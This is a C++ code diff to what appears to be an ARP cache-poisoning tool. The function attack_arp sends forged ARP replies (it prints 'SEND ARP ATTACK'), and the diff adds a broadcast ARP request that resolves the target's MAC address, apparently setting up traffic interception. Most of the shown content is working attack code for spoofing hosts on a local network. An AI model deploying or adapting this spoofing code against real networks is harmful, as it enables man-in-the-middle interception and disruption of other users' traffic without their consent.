@@ -65,7 +65,7 @@ ArpPacket* get_packet(pcap_t* pcap, std::string mac_){
         }
         ethernet = (Ethernet*) packet;
 
-        ethernet->print_ethernet();
+        // ethernet->print_ethernet();
         stoi_mac(mac_, tmp);
         if(ethernet->get_ether_type() != 0x0806){
         	continue;
@@ -89,7 +89,7 @@ ArpPacket* get_packet(pcap_t* pcap, std::string mac_){
 
 
 
-ArpPacket* attack_arp(char* dev, char* sender_ip, char* target_ip, pcap_t* pcap){
+ArpPacket* attack_arp(char* dev, char* sender_ip, char* target_ip, pcap_t* pcap, Mac* target_mac_add){
     //Send Arp Request
     std::string d_mac_  = "ff:ff:ff:ff:ff:ff";
     std::string s_mac_ = get_my_mac(dev);
@@ -103,7 +103,7 @@ ArpPacket* attack_arp(char* dev, char* sender_ip, char* target_ip, pcap_t* pcap)
     // taget_packet_arp.print_arp();
 
     uint8_t* mac_ = target_packet_ethernet.get_s_mac();
-    char buf[20]; // enough size
+    char buf[20];
     sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac_[0], mac_[1], mac_[2], mac_[3], mac_[4], mac_[5]);
 
     std::string target_mac = std::string(buf);
@@ -111,6 +111,23 @@ ArpPacket* attack_arp(char* dev, char* sender_ip, char* target_ip, pcap_t* pcap)
 
     ArpPacket* arpPacket = arp_reply(pcap, dev, target_mac,  s_mac_,  target_ip, sender_ip);
     printf("SEND ARP ATTACK\n");
+
+
+
+
+    arp_request(pcap, dev, d_mac_, s_mac_, (char*)my_ip.c_str(), target_ip, 0x0001); // broadcast to get target's mac'
+    ArpPacket* target_packet2 = get_packet(pcap, s_mac_);
+    Ethernet target_packet2_ethernet = target_packet2->get_ethernet();
+    // taget_packet_ethernet.print_ethernet();
+    Arp target_packet2_arp = target_packet2->get_arp();
+    // target_packet2_arp.print_arp();
+
+    uint8_t* mac2_ = target_packet2_ethernet.get_s_mac();
+    char buf2[20];
+    sprintf(buf2, "%02X:%02X:%02X:%02X:%02X:%02X", mac2_[0], mac2_[1], mac2_[2], mac2_[3], mac2_[4], mac2_[5]);
+
+    std::string target_mac2 = std::string(buf2);
+    *target_mac_add =  Mac(target_mac2);
     return arpPacket;
 
 }
